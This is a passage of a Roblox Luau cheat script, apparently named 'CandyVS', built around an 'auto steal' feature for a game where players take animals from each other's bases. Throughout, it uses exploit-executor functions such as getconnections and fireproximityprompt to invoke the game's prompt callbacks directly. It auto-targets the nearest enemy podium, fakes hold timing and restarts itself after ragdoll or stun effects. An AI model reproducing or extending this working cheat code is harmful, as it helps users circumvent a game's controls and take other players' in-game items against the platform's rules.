	if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end)
	syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
	for _, action in ipairs(actions) do
	local kind, channelName = action[1], tostring(action[2])
	if plots:FindFirstChild(channelName) then
	if kind == "ListenerAdded" then
	local remote = syncRemotes.channelFolder:FindFirstChild(channelName)
	if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote) end
	elseif kind == "ListenerRemoved" then
	detachPlotChannel(channelName)
	end
	end
	end
	end)
	syncStarted = true
	return true
	end

	local function getPlotChannelData(plotName)
	return plotAnimalSync.caches[plotName]
	end

	local function getAnimalPosition(animalData)
	local plot = plots:FindFirstChild(animalData.plot)
	local podiums = plot and plot:FindFirstChild("AnimalPodiums")
	local podium = podiums and podiums:FindFirstChild(animalData.slot)
	return podium and podium:GetPivot().Position
	end

	local function distToAnimal(animalData)
	local character = Player.Character
	local hrp = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso"))
	if not hrp then return math.huge end
	local pos = getAnimalPosition(animalData)
	if not pos then return math.huge end
	return (hrp.Position - pos).Magnitude
	end

	local function scanAllPlots()
	if not plots then return {} end
	local newCache = {}
	for _, plot in ipairs(plots:GetChildren()) do
	local cache = getPlotChannelData(plot.Name)
	local animalList = cache and cache.AnimalList
	if typeof(animalList) == "table" then
	for slot, animalData in pairs(animalList) do
	if type(animalData) == "table" then
	local animalName = animalData.Index
	local animalInfo = AnimalsData[animalName]
	if animalInfo then
	table.insert(newCache, {
	name = animalInfo.DisplayName or animalName,
	plot = plot.Name,
	slot = tostring(slot),
	uid = plot.Name .. "_" .. tostring(slot),
	})
	end
	end
	end
	end
	end
	allAnimalsCache = newCache
	return #allAnimalsCache
	end

	local function buildStealCallbacks(prompt)
	if InternalStealCache[prompt] then return end
	local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
	local ok1, conns1 = false, nil
	if getconnections then ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan) end
	if ok1 and type(conns1) == "table" then
	for _, conn in ipairs(conns1) do
	if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
	end
	end
	local ok2, conns2 = false, nil
	if getconnections then ok2, conns2 = pcall(getconnections, prompt.Triggered) end
	if ok2 and type(conns2) == "table" then
	for _, conn in ipairs(conns2) do
	if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
	end
	end
	if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then
	InternalStealCache[prompt] = data
	end
	end

	local function executeStealAsync(prompt, animalData)
	local data = InternalStealCache[prompt]
	if not data or not data.ready then return false end
	data.ready = false
	local label = animalData and animalData.name or "Animal"
	StealState.active = true
	StealState.startTime = tick()
	StealState.phase = "holding"
	StealState.label = label
	setStealState(false)
	v1Progress = 0
	local runGeneration = autoStealGeneration
	task.spawn(function()
	CONFIG_AUTO_STEAL.HOLD_MIN = autoStealValues.Duration or CONFIG_AUTO_STEAL.HOLD_MIN
	CONFIG_AUTO_STEAL.HOLD_MAX = CONFIG_AUTO_STEAL.HOLD_MIN + 1.3
	for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
	while tick() - StealState.startTime < CONFIG_AUTO_STEAL.HOLD_MIN do
	if runGeneration ~= autoStealGeneration then data.ready = true; return end
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED or not prompt.Parent then break end
	local elapsed = tick() - StealState.startTime
	v1Progress = math.clamp(elapsed / CONFIG_AUTO_STEAL.HOLD_MAX, 0, 1)
	task.wait(0.05)
	end
	StealState.phase = "waitingRange"
	local alreadyInRange = animalData and distToAnimal(animalData) <= CONFIG_AUTO_STEAL.STEAL_RANGE
	local fired = false
	while runGeneration == autoStealGeneration and CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED and prompt.Parent do
	local elapsed = tick() - StealState.startTime
	v1Progress = math.clamp(elapsed / CONFIG_AUTO_STEAL.HOLD_MAX, 0, 1)
	if elapsed > CONFIG_AUTO_STEAL.HOLD_MAX then break end
	if animalData and distToAnimal(animalData) <= CONFIG_AUTO_STEAL.STEAL_RANGE then
	if not alreadyInRange then task.wait(CONFIG_AUTO_STEAL.ENTRY_DELAY) end
	for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
	fired = true
	break
	end
	task.wait(0.05)
	end
	if runGeneration ~= autoStealGeneration then data.ready = true; return end
	if fired then
	StealState.totalSteals = StealState.totalSteals + 1
	StealState.lastResult = "Stole " .. label
	StealState.phase = "success"
	setStealState(true)
	else
	StealState.failedSteals = StealState.failedSteals + 1
	StealState.lastResult = "Missed window: " .. label
	StealState.phase = "failed"
	end
	StealState.active = false
	StealState.lastResultTime = tick()
	v1Progress = 1
	task.wait(CONFIG_AUTO_STEAL.COOLDOWN)
	v1Progress = 0
	data.ready = true
	end)
	return true
	end

	local function attemptSteal(prompt, animalData)
	if not prompt or not prompt.Parent then return false end
	buildStealCallbacks(prompt)
	return executeStealAsync(prompt, animalData)
	end

                local V3New = {
                    busy = false,
                    active = false,
                    progress = 0,
                    isStealing = false,
                    currentTarget = nil,
                    totalSteals = 0,
                    failedSteals = 0,
                    lastResult = "",
                    generation = 0,
                    phase = "idle",
                    startTime = 0,
                    data = {}
                }
                
                local V3Config = {
                    RADIUS = 65,
					HOLD_MIN = 1.3,           
					HOLD_MAX = 2.6,           
					NEAR_TARGET_RANGE = 20,
					ENTRY_DELAY = 0.3,
					FIRE_RANGE = 12, 
                    COOLDOWN = 0.45,
                }
					local v3TargetCache = { prompt = nil, radius = 0, expiresAt = 0 }

                local function v3NewFindNearestPrompt(searchRadius)
					local radius = math.max(0, tonumber(searchRadius) or V3Config.RADIUS)
					if v3TargetCache.expiresAt > tick()
					and v3TargetCache.radius == radius
					and v3TargetCache.prompt
					and v3TargetCache.prompt.Parent then
					return v3TargetCache.prompt
					end
                    local char = Player.Character
                    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
                    if not root then return nil end
                    
					local nearest, nearestDistSq = nil, math.huge
					local radiusSq = radius * radius
                    
                    for _, plot in ipairs(plots:GetChildren()) do
                        local sign = plot:FindFirstChild("PlotSign")
                        local yourBase = sign and sign:FindFirstChild("YourBase")
                        if plot:IsA("Model") and not (yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled) then
                            local pods = plot:FindFirstChild("AnimalPodiums")
                            if pods then
                                for _, pod in ipairs(pods:GetChildren()) do
                                    local spawn = pod:FindFirstChild("Base") and pod.Base:FindFirstChild("Spawn")
                                    if spawn then
									local delta = spawn.Position - root.Position
									local distanceSq = delta:Dot(delta)
									if distanceSq <= radiusSq and distanceSq < nearestDistSq then
										local prompt = getCachedStealPrompt(spawn)
										if prompt then nearest, nearestDistSq = prompt, distanceSq end
                                        end
                                    end
                                end
                            end
                        end
                    end
					v3TargetCache.prompt = nearest
					v3TargetCache.radius = radius
					v3TargetCache.expiresAt = tick() + 0.12
                    return nearest
                end

                _G.__CandyVSAutoGrabTargetInRadius = function(radius)
                    return v3NewFindNearestPrompt(radius or 65) ~= nil
                end

                local function v3NewGetPromptDistance(prompt)
                    local char = Player.Character
                    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
                    if not root then return math.huge end
                    
                    local part = prompt.Parent
                    if part and part:IsA("Attachment") then part = part.Parent end
                    if part and part:IsA("BasePart") then 
                        return (part.Position - root.Position).Magnitude 
                    end
                    
                    local ok, pos = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
                    if ok and pos then
                        return (pos - root.Position).Magnitude
                    end
                    return math.huge
                end

				local function v3NewGetPromptCallbacks(prompt)
                    local data = V3New.data[prompt]
                    if data then return data end
                    
                    data = { hold = {}, trigger = {}, ready = true }
                    
                    if getconnections then
                        for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                            if conn.Function then
                                table.insert(data.hold, conn.Function)
                            end
                        end
                        for _, conn in ipairs(getconnections(prompt.Triggered)) do
                            if conn.Function then
                                table.insert(data.trigger, conn.Function)
                            end
                        end
                    end
                    
                    V3New.data[prompt] = data
					return data
				end

				local function v3NewTriggerPrompt(prompt, data)
					if not prompt or not prompt.Parent then return false end
					if Player:GetAttribute("Stealing") == true then return false end
					local invoked = false
					for _, callback in ipairs(data.trigger) do
						local ok = pcall(callback)
						if ok then invoked = true end
					end
					if not invoked and Player:GetAttribute("Stealing") ~= true and typeof(fireproximityprompt) == "function" then
						local ok = pcall(fireproximityprompt, prompt)
						invoked = ok or invoked
					end
					if not invoked and Player:GetAttribute("Stealing") ~= true then
						local ok = pcall(function()
							prompt:InputHoldBegin()
							task.wait(0.05)
							prompt:InputHoldEnd()
						end)
						invoked = ok
					end
					return invoked
				end

				local function v3NewExecuteSteal(prompt)
					if V3New.busy or not prompt or not prompt.Parent then return end
					if Player:GetAttribute("Stealing") == true then return end
					
					local data = v3NewGetPromptCallbacks(prompt)
					if #data.trigger == 0 then
						V3New.data[prompt] = nil
						data = v3NewGetPromptCallbacks(prompt)
					end
                    if not data.ready then return end
                    
                    data.ready = false
                    V3New.busy = true
                    V3New.active = true
                    V3New.isStealing = true
                    V3New.startTime = tick()
                    V3New.progress = 0
                    V3New.phase = "holding"
                    V3New.generation = V3New.generation + 1
                    local runGen = V3New.generation
                    
                    setStealState(true)
                    
                    task.spawn(function()
                        for _, callback in ipairs(data.hold) do
                            task.spawn(callback)
                        end
                        
                        local holdStart = tick()
                        
                        while V3New.busy and tick() - holdStart < V3Config.HOLD_MIN do
                            if runGen ~= V3New.generation then return end
                            V3New.progress = math.clamp((tick() - holdStart) / V3Config.HOLD_MIN, 0, 1)
                            v1Progress = V3New.progress
							task.wait(0.05)
                        end
                        
                        if runGen ~= V3New.generation then return end
                        
                        V3New.progress = 1  
                        v1Progress = 1
                        V3New.phase = "waiting"
                        
						local wasInRange = v3NewGetPromptDistance(prompt) <= V3Config.FIRE_RANGE
                        local fired = false
                        
						while runGen == V3New.generation and
							prompt.Parent and
							CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED and Player:GetAttribute("Stealing") ~= true do
                            
                            V3New.progress = 1
                            v1Progress = 1
                            
							local promptDistance = v3NewGetPromptDistance(prompt)
							if promptDistance > V3Config.NEAR_TARGET_RANGE and tick() - holdStart > V3Config.HOLD_MAX then
								break
							end

							if promptDistance <= V3Config.FIRE_RANGE then
								local canTrigger = true
								if not wasInRange then
									task.wait(V3Config.ENTRY_DELAY)
									if runGen ~= V3New.generation or not prompt.Parent
									or v3NewGetPromptDistance(prompt) > V3Config.FIRE_RANGE then
										task.wait(0.05)
										canTrigger = false
									end
								end
								if canTrigger then
                                
                                V3New.phase = "triggering"
                                
								local didTrigger = v3NewTriggerPrompt(prompt, data)
								if not didTrigger then
									V3New.phase = "waiting"
									task.wait(0.05)
								else
                                
                                V3New.totalSteals = V3New.totalSteals + 1
                                StealState.totalSteals = StealState.totalSteals + 1
                                V3New.lastResult = "✅ ROBADO!"
                                StealState.lastResult = "Stole"
                                fired = true
                                V3New.isStealing = true
                                V3New.phase = "success"
                                break
								end
								end
                            end
							task.wait(0.05)
                        end
                        
                        if runGen ~= V3New.generation then return end
                        
                        V3New.active = false
                        V3New.isStealing = false
                        V3New.busy = false
                        data.ready = true
                        
                        setStealState(false)
                        
                        if not fired then
                            V3New.failedSteals = V3New.failedSteals + 1
                            V3New.lastResult = "❌ FALLÓ"
                            V3New.phase = "failed"
                        end
                        
                        V3New.lastResultTime = tick()
                        StealState.lastResultTime = tick()
                        
                        task.wait(V3Config.COOLDOWN)
                        if runGen ~= V3New.generation then return end
                        V3New.progress = 0
                        v1Progress = 0
                        V3New.phase = "idle"
                    end)
                end

	local V2Grab = {
	busy = false,
	active = false,
	progress = 0,
	paused = false,
	pauseTime = nil,
	totalSteals = 0,
	failedSteals = 0,
	lastResult = "",
	generation = 0,
	phase = "idle",
	data = {},
	}

	local V2GrabConfig = {
	STEAL_DURATION = 1.3,
	HOLD_TARGET = 0.8,
	TRIGGER_RADIUS = 10,
	PAUSE_TIMEOUT = 1.3,
	COOLDOWN = 0.05,
	}

	local function v2GrabGetCallbacks(prompt)
	local data = V2Grab.data[prompt]
	if data then return data end
	data = { hold = {}, trigger = {}, ready = true }
	if getconnections then
	pcall(function()
	for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
	if conn.Function then table.insert(data.hold, conn.Function) end
	end
	for _, conn in ipairs(getconnections(prompt.Triggered)) do
	if conn.Function then table.insert(data.trigger, conn.Function) end
	end
	end)
	end
	V2Grab.data[prompt] = data
	return data
	end

	local function v2GrabExecuteSteal(prompt)
	if V2Grab.busy or not prompt or not prompt.Parent then return end
	if Player:GetAttribute("Stealing") == true then return end
	local data = v2GrabGetCallbacks(prompt)
	if not data.ready then return end

	data.ready = false
	V2Grab.busy = true
	V2Grab.active = true
	V2Grab.progress = 0
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.phase = "holding"
	V2Grab.generation = V2Grab.generation + 1
	local runGen = V2Grab.generation
	local startTime = tick()
	local pauseArmed = true
	local fired = false
	StealState.active = true
	StealState.startTime = startTime
	StealState.phase = "holding"
	v1Progress = 0
	setStealState(true)

	task.spawn(function()
	for _, callback in ipairs(data.hold) do
	task.spawn(function() pcall(callback) end)
	end

	while runGen == V2Grab.generation
	and CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED
	and autoStealMode == "v2"
	and Player:GetAttribute("Stealing") ~= true
	and prompt.Parent do
	if V2Grab.paused then
	local distance = v3NewGetPromptDistance(prompt)
	if distance <= V2GrabConfig.TRIGGER_RADIUS then
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.phase = "finishing"
	startTime = tick() - (V2GrabConfig.HOLD_TARGET * V2GrabConfig.STEAL_DURATION)
	else
	if not V2Grab.pauseTime then
	V2Grab.pauseTime = tick()
	elseif tick() - V2Grab.pauseTime >= V2GrabConfig.PAUSE_TIMEOUT then
	break
	end
	V2Grab.progress = V2GrabConfig.HOLD_TARGET
	v1Progress = V2Grab.progress
	StealState.label = "80%"
	task.wait(0.05)
	end
	end

	if not V2Grab.paused then
	local progress = math.clamp((tick() - startTime) / V2GrabConfig.STEAL_DURATION, 0, 1)
	V2Grab.progress = progress
	v1Progress = progress
	StealState.label = math.floor(progress * 100 + 0.5) .. "%"

	if pauseArmed and progress >= V2GrabConfig.HOLD_TARGET then
	pauseArmed = false
	V2Grab.paused = true
	V2Grab.pauseTime = tick()
	V2Grab.progress = V2GrabConfig.HOLD_TARGET
	v1Progress = V2Grab.progress
	V2Grab.phase = "waitingRange"
	StealState.phase = "waitingRange"
	elseif progress >= 1 then
	V2Grab.phase = "triggering"
	for _, callback in ipairs(data.trigger) do
	task.spawn(function() pcall(callback) end)
	end
	fired = true
	break
	end
	task.wait(0.05)
	end
	end

	if runGen ~= V2Grab.generation then return end
	V2Grab.active = false
	V2Grab.busy = false
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	data.ready = true
	StealState.active = false
	StealState.lastResultTime = tick()
	setStealState(false)

	if fired then
	V2Grab.totalSteals = V2Grab.totalSteals + 1
	V2Grab.lastResult = "Stole"
	V2Grab.phase = "success"
	StealState.totalSteals = StealState.totalSteals + 1
	StealState.lastResult = "Stole"
	else
	V2Grab.failedSteals = V2Grab.failedSteals + 1
	V2Grab.lastResult = "Missed window"
	V2Grab.phase = "failed"
	StealState.failedSteals = StealState.failedSteals + 1
	StealState.lastResult = "Missed window"
	end

	task.wait(V2GrabConfig.COOLDOWN)
	if runGen == V2Grab.generation then
	V2Grab.progress = 0
	v1Progress = 0
	V2Grab.phase = "idle"
	end
	end)
	end

	local function _startStealHeartbeat()
	if stealConnection then return end
	local elapsed = 0
	stealConnection = RunService.Heartbeat:Connect((function(dt)
	elapsed = elapsed + (dt or 0)
	local scanInterval = 0.15
	if elapsed < scanInterval then return end
	elapsed = 0
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then return end
	if Player:GetAttribute("Stealing") == true then return end
	if _G.__CandyVSAutoGrabRagdollBlocked == true then return end
	if toggleStates["Auto Steal Lock"] == true then return end
	if StealState.active or V2.busy or V3New.busy or V2Grab.busy then return end
	if autoStealMode == "v2" then
	local prompt = v3NewFindNearestPrompt(autoStealValues.Radius)
	if prompt then v2GrabExecuteSteal(prompt) end
	return
	end
	if autoStealMode == "v1" then
	local prompt = v3NewFindNearestPrompt(autoStealValues.Radius)
	if prompt then v3NewExecuteSteal(prompt) end
	return
	end
	end))
	end

	_G.CandyVSAutoStealRunCycle = function(prompt, target)
	return attemptSteal(prompt, target)
	end

	local function stopStealDetection()
	if _stealDetectConns then for _, c in ipairs(_stealDetectConns) do pcall(function() c:Disconnect() end) end end
	_stealDetectConns = {}
	if _stealDetectTimer then task.cancel(_stealDetectTimer); _stealDetectTimer = nil end
	end

	local startStealDetection = (function(char)
	stopStealDetection()
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	table.insert(_stealDetectConns, hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
	setStealState(hum.WalkSpeed < 22)
	end))
	local function watchPrompt(obj)
	if not obj:IsA("ProximityPrompt") then return end
	table.insert(_stealDetectConns, obj.PromptButtonHoldBegan:Connect(function(player)
	if player ~= LP then return end
	setStealState(true)
	if _stealDetectTimer then task.cancel(_stealDetectTimer) end
	_stealDetectTimer = task.delay(CONFIG_AUTO_STEAL.HOLD_MAX + 0.5, function()
	setStealState(false)
	end)
	end))
	table.insert(_stealDetectConns, obj.Triggered:Connect(function(player)
	if player ~= LP then return end
	task.delay(0.2, function() setStealState(false) end)
	end))
	end
	table.insert(_stealDetectConns, workspace.DescendantAdded:Connect(function(obj)
	task.defer(watchPrompt, obj)
	end))
	_G.__CandyVSWalkDescendantsBatched(plots, watchPrompt, function()
	return char.Parent ~= nil
	end)
	end)

	local function ensureSyncLoop()
	if syncLoopStarted then return end
	syncLoopStarted = true
	task.spawn(function()
	if startAutoStealSync() then
	if CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then scanAllPlots() end
	while candyvsRuntimeState.alive do
	task.wait(5)
	if not candyvsRuntimeState.alive then break end
	if CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then scanAllPlots() end
	end
	end
	end)
	end

	ensureSyncLoop()
	if Player.Character then task.defer(startStealDetection, Player.Character) end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	startStealDetection(char)
	if toggleStates["auto steal"] then
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = false
	if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = true
	scanAllPlots()
	_startStealHeartbeat()
	end
	end))

	_G.CandyVSAutoGrab = {
	GetMode = function() return autoStealMode end,
	SetMode = function(mode)
	if mode ~= "v1" and mode ~= "v2" then return false end
	autoStealMode = mode
	saveConfig()
	return true
	end,
	}

	local function enableAutoSteal()
	ensureSyncLoop()
	scanAllPlots()
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = true
	_startStealHeartbeat()
	end

	local function disableAutoSteal()
	autoStealGeneration = autoStealGeneration + 1
	if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
	CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED = false
	StealState.active = false
	StealState.phase = "idle"
	setStealState(false)
	v1Progress = 0
	InternalStealCache = {}
	V2.busy = false
	V2.data = {}
	if V3New then
	V3New.generation = V3New.generation + 1
	V3New.busy = false
	V3New.active = false
	V3New.isStealing = false
	V3New.progress = 0
	V3New.phase = "idle"
	V3New.data = {}
	end
	if V2Grab then
	V2Grab.generation = V2Grab.generation + 1
	V2Grab.busy = false
	V2Grab.active = false
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.progress = 0
	V2Grab.phase = "idle"
	V2Grab.data = {}
	end
	end

	autoStealDisableInternal = disableAutoSteal
	_G.__CandyVSTrackConn(Player.CharacterRemoving:Connect(disableAutoSteal))
	_G.__CandyVSTrackStopper(disableAutoSteal)

	;(function()
	local restartSerial = 0
	local humanoidStateConnection = nil
	local platformStandConnection = nil
	local stoneSignalConnection = nil
	local ragdollLatched = false
	local ragdollResumeScheduled = false
	local stoneDetectedUntil = 0
	local RAGDOLL_DURATION = 3.0
	local RAGDOLL_REMAINING_BEFORE_GRAB = 2.0
	local STONE_MEMORY_DURATION = 5.0

	local function isRagdollState(hum, state)
	return hum.PlatformStand
	or state == Enum.HumanoidStateType.Physics
	or state == Enum.HumanoidStateType.Ragdoll
	or state == Enum.HumanoidStateType.FallingDown
	end

	local function hasPetrificationSignal(char)
	if not char then return false end
	for _, obj in ipairs(char:GetDescendants()) do
	if not obj:FindFirstAncestorOfClass("Tool") then
	local name = obj.Name:lower()
	if name:find("medusa") or name:find("petrif") or name:find("gorgon") or name:find("stone") then
	return true
	end
	for attributeName, value in pairs(obj:GetAttributes()) do
	local key = tostring(attributeName):lower()
	if value and (key:find("medusa") or key:find("petrif") or key:find("gorgon") or key:find("stone")) then
	return true
	end
	end
	end
	end
	return false
	end

	local function restartAfterRagdoll(_cameFromStone)
	restartSerial = restartSerial + 1
	local thisRestart = restartSerial
	_G.__CandyVSAutoGrabRagdollBlocked = true
	ragdollResumeScheduled = true
	disableAutoSteal()
	task.delay(math.max(0, RAGDOLL_DURATION - RAGDOLL_REMAINING_BEFORE_GRAB), function()
	if thisRestart ~= restartSerial then return end
	ragdollResumeScheduled = false
	if not toggleStates["auto steal"] then return end
	_G.__CandyVSAutoGrabRagdollBlocked = false
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then enableAutoSteal() end
	pcall(function()
	if _G.CandyVSBypass and _G.CandyVSBypass.IsAutoOnSteal and _G.CandyVSBypass.IsAutoOnSteal() and _G.CandyVSBypass.SetAutoOnSteal then
	pcall(_G.CandyVSBypass.SetAutoOnSteal, true)
	end
	end)
	end)
	end

	local function bindRagdollRestart(char)
	if humanoidStateConnection then
	humanoidStateConnection:Disconnect()
	humanoidStateConnection = nil
	end
	if platformStandConnection then
	platformStandConnection:Disconnect()
	platformStandConnection = nil
	end
	if stoneSignalConnection then
	stoneSignalConnection:Disconnect()
	stoneSignalConnection = nil
	end
	ragdollLatched = false
	stoneDetectedUntil = 0
	local hum = char and (char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5))
	if not hum then return end
	if hasPetrificationSignal(char) then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	stoneSignalConnection = char.DescendantAdded:Connect(function(obj)
	if obj:FindFirstAncestorOfClass("Tool") then return end
	local name = obj.Name:lower()
	if name:find("medusa") or name:find("petrif") or name:find("gorgon") or name:find("stone") then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	end)
	local function updateRagdollState(state)
	if hasPetrificationSignal(char) then
	stoneDetectedUntil = tick() + STONE_MEMORY_DURATION
	end
	local ragdolled = isRagdollState(hum, state)
	if ragdolled and not ragdollLatched then
	ragdollLatched = true
	restartAfterRagdoll(tick() <= stoneDetectedUntil)
	elseif not ragdolled then
	ragdollLatched = false
	if not ragdollResumeScheduled then
	_G.__CandyVSAutoGrabRagdollBlocked = false
	if toggleStates["auto steal"] and not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED then
		enableAutoSteal()
	end
	end
	end
	end
	humanoidStateConnection = hum.StateChanged:Connect(function(_, state)
	updateRagdollState(state)
	end)
	platformStandConnection = hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	updateRagdollState(hum:GetState())
	end)
	end

	if Player.Character then task.defer(bindRagdollRestart, Player.Character) end
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	restartSerial = restartSerial + 1
	ragdollResumeScheduled = false
	_G.__CandyVSAutoGrabRagdollBlocked = false
	bindRagdollRestart(char)
	end))
	end)()

	FeaturePostToggle["auto steal"] = function(active)
	if active then
	if _G.__CandyVSAutoGrabRagdollBlocked ~= true then enableAutoSteal() end
	else
	disableAutoSteal()
	end
	end

	if toggleStates["auto steal"] then enableAutoSteal() end
	end

	do
	do
	local function setFeatureState(featureName, state)
	if toggleStates[featureName] == state then return end
	toggleStates[featureName] = state
	if FeaturePostToggle[featureName] then
	FeaturePostToggle[featureName](state)
	end
	if toggleVisualUpdaters[featureName] then
	toggleVisualUpdaters[featureName]()
	end
	saveConfig()
	end

	local function disableBoth()
	setFeatureState("Autoplay", false)
	end

	local function showStealCountdown(char)
	if not char then return end
	local nowT = os.clock()
	if _G._CandyVSHitCountdownLast and (nowT - _G._CandyVSHitCountdownLast) < 0.15 then return end
	_G._CandyVSHitCountdownLast = nowT
	local gen = (_G._CandyVSHitCountdownGen or 0) + 1
	_G._CandyVSHitCountdownGen = gen
	_G._CandyVSHitCountdownActive = true
	if _G._CandyVSHitCountdownBB then
	pcall(function() _G._CandyVSHitCountdownBB:Destroy() end)
	_G._CandyVSHitCountdownBB = nil
	end

	pcall(function() _G._CandyVSShowStealCountdown = showStealCountdown end)
	local root = char:FindFirstChild("LowerTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
	if not root then _G._CandyVSHitCountdownActive = false; return end
	local bb = Instance.new("BillboardGui")
	bb.Name = "CandyVSHitCountdown"
	bb.Adornee = root
	bb.Size = UDim2.new(0, 120, 0, 56)
	bb.StudsOffset = Vector3.new(0, 0.6, 0)
	bb.AlwaysOnTop = true
	bb.LightInfluence = 0
	local parentGui = Player and (Player:FindFirstChildOfClass("PlayerGui") or game:GetService("CoreGui")) or game:GetService("CoreGui")
	bb.Parent = parentGui
	_G._CandyVSHitCountdownBB = bb

	local frame = Instance.new("Frame", bb)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Position = UDim2.new(0, 0, 0, 6)
	label.BackgroundTransparency = 1
	label.Text = "3"
	label.TextScaled = false
	label.TextSize = 28
	label.Font = Enum.Font.FredokaOne
	label.TextColor3 = Color3.fromRGB(175, 180, 185)
	label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	label.TextStrokeTransparency = 0
	label.ZIndex = 10
	label.TextTransparency = 1

	local function animateText(txt, color)
	label.Text = txt
	if color then label.TextColor3 = color end
	local hold = (txt == "STEAL!") and 1.0 or 0.76
	for i = 0, 6 do
	label.TextTransparency = 1 - (i / 6)
	task.wait(0.02)
	if _G._CandyVSHitCountdownGen ~= gen then return false end
	end
	task.wait(hold)
	if _G._CandyVSHitCountdownGen ~= gen then return false end
	for i = 0, 6 do
	label.TextTransparency = i / 6
	task.wait(0.02)
	if _G._CandyVSHitCountdownGen ~= gen then return false end
	end
	return true
	end

	task.spawn(function()
	pcall(function()
	label.TextStrokeTransparency = 0
	label.TextColor3 = Color3.fromRGB(175, 180, 185)
	for step = 0, 24 do
	local value = 2.4 - (2.4 * step / 24)
	local display = value <= 0.05 and "0" or string.format("%.1f", value)
	label.Text = display
	label.TextTransparency = 0
	for i = 0, 2 do
	label.TextTransparency = 0.18 * i
	task.wait(0.02)
	if _G._CandyVSHitCountdownGen ~= gen then return end
	end
	if _G._CandyVSHitCountdownGen ~= gen then return end
	task.wait(0.08)
	if _G._CandyVSHitCountdownGen ~= gen then return end
	end
	if not animateText("STEAL!", Color3.fromRGB(175, 180, 185)) then return end
	end)
	if _G._CandyVSHitCountdownGen == gen then
	pcall(function() bb:Destroy() end)
	if _G._CandyVSHitCountdownBB == bb then _G._CandyVSHitCountdownBB = nil end
	_G._CandyVSHitCountdownActive = false
	end
	end)
	end

	local function attachDamageDetection(char)
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local lastHealth = hum.Health

	hum.HealthChanged:Connect(function(newHealth)
	if newHealth < lastHealth then
	disableBoth()
	pcall(function() showStealCountdown(char) end)
	end
	lastHealth = newHealth
	end)

	if hum.StateChanged then
	hum.StateChanged:Connect(function(oldState, newState)
	local isRagdolled = (newState == Enum.HumanoidStateType.Physics or newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown)
	if isRagdolled then
	pcall(function() showStealCountdown(char) end)
	end
	end)
	end

	pcall(function()
	hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	if hum.PlatformStand then pcall(function() showStealCountdown(char) end) end
	end)
	end)

	hum.Died:Connect(function()
	disableBoth()
	end)

	end

	if Player.Character then
	attachDamageDetection(Player.Character)
	end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	local hum = char:WaitForChild("Humanoid", 5)
	if hum then
	disableBoth()               
	attachDamageDetection(char)
	else
	task.wait(0.5)
	disableBoth()
	attachDamageDetection(char)
	end
	end))
	end
	do
	local unwalkState = {
		generation = 0,
		animationConn = nil,
		animate = nil,
		disabledByUs = false,
	}

	local function disconnectUnwalk()
		unwalkState.generation = unwalkState.generation + 1
		if unwalkState.animationConn then
			unwalkState.animationConn:Disconnect()
			unwalkState.animationConn = nil
		end
	end

	local function resumeAnimations(force)
		local animate = unwalkState.animate
		local shouldEnable = unwalkState.disabledByUs
		unwalkState.animate = nil
		unwalkState.disabledByUs = false
		if animate and animate.Parent and shouldEnable and (force or not toggleStates["Unwalk"]) then
			pcall(function() animate.Disabled = false end)
		end
	end

	local function applyUnwalk(character)
		local previousAnimate = unwalkState.animate
		local previouslyDisabledByUs = unwalkState.disabledByUs
		disconnectUnwalk()
